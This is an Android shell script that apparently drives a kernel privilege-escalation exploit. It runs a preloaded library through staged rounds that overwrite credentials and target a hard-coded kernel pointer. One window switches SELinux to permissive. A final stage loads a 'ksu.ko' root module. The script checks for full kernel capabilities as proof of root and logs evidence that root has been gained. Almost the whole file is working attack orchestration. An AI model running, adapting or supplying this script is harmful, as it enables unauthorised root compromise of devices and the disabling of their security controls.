#!/system/bin/sh
# c-strike (2026-09-06): R -> C 一次性组合, 信标取证, C 后不再碰 child。
OUTD=/data/local/tmp
LOG=$OUTD/cstrike_log.txt
LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
LOAD_INT=${LOAD%.*}
if [ "${LOAD_INT:-99}" -gt 15 ]; then echo "load gate refuse: $LOAD"; exit 2; fi
echo "=== cstrike start $(date +%H:%M:%S) preload=$(sha256sum $OUTD/preload.so | cut -d' ' -f1)" > $LOG
rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt $OUTD/R.out $OUTD/C2.out
am kill-all 2>/dev/null

echo "--- R round ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/R.out 2>&1
echo "R rc=$? status=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)" >> $LOG
ST=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)
TASK=$(printf '%s' "$ST" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
if printf '%s' "$ST" | grep -aq "CapEff=000001ffffffffff"; then
  echo "R LANDED, TASK=$TASK — C strike in 30s" >> $LOG
else
  echo "R MISS — no C strike (child not armed)" >> $LOG
  echo "=== end $(date +%H:%M:%S)" >> $LOG; cat $LOG; exit 0
fi
sleep 30

# mt84+: E5v3 permissive window BEFORE C/KO (kernel-SID finit_module needs it)
echo "--- E5v3 permissive window ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 \
  PSELECT_CONSUMER_CPU=6 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/E5.out 2>&1
E5ENF=$(getenforce)
echo "E5 rc=$? enforce=$E5ENF" >> $LOG

# mt86: child 心跳新鲜度校验 — stale 文件同样含 CapEff=full, 不可盲信
NOW=$(date +%s); MT=$(stat -c %Y $OUTD/mt49_child_status.txt 2>/dev/null || echo 0)
AGE=$((NOW-MT))
if [ $AGE -gt 15 ]; then
  echo "C ABORT: child heartbeat stale ${AGE}s (child dead?) — 不击" >> $LOG
  echo "=== end $(date +%H:%M:%S)" >> $LOG; cat $LOG; exit 0
fi
echo "--- C strike (LAST touch of this child) ---" >> $LOG
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_TASK=$TASK PSELECT_CONSUMER_CPU=6 \
  PSELECT_KO=/data/local/tmp/ksu.ko \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/C2.out 2>&1
CPID=$(grep -a "child pid" $OUTD/R.out 2>/dev/null | tail -1 | sed 's/.*child pid=\([0-9]*\).*/\1/')
echo "C rc=$? enforce=$(getenforce) hostname=$(cat /proc/sys/kernel/hostname)" >> $LOG
echo "child=$CPID Uid-line:" >> $LOG
cat /proc/$CPID/status 2>/dev/null | grep -E "^(Name|State|Uid|Gid|CapEff)" >> $LOG
echo "child-alive=$(ls /proc/$CPID/status 2>/dev/null && echo YES || echo DEAD)" >> $LOG
grep -a "mt48: PTR\|mt51:\|ROOT-SEEN\|mt73\|hostname" $OUTD/C2.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -8 >> $LOG

echo "--- evidence poll 120s ---" >> $LOG
N=0
while [ $N -lt 12 ]; do
  sleep 10; N=$((N+1))
  RA=$(cat $OUTD/root_alive.txt 2>/dev/null | head -1)
  HN=$(cat /proc/sys/kernel/hostname 2>/dev/null)
  ST2=$(cat $OUTD/mt49_child_status.txt 2>/dev/null)
  echo "t=$((N*10))s root_alive=[$RA] hostname=[$HN] status=[$ST2] boot=$(cat /proc/sys/kernel/random/boot_id | cut -c1-8)" >> $LOG
done
echo "=== end $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
cat $LOG
